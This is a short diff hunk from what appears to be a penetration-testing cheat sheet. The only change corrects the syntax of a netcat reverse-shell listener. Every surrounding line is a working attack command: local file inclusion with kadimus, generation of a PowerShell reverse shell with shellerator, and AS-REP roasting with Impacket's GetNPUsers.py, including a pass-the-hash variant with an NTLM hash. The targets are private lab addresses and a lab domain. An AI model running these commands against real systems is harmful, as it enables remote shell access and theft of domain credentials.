@@ -100,7 +100,7 @@ kadimus -u 'http://192.168.10.10/?page=file1.php'
 kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u 'http://192.168.10.10/?page=file1.php'
 shellerator --reverse-shell --ip 192.168.56.1 --port 1337 --type powershell
 shellerator
-rlwrap -nc lvnp 1337
+rlwrap nc -lvnp 1337
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt BREAKING.BAD/anonymous:anonymous
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip 192.168.56.101 BREAKING.BAD/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
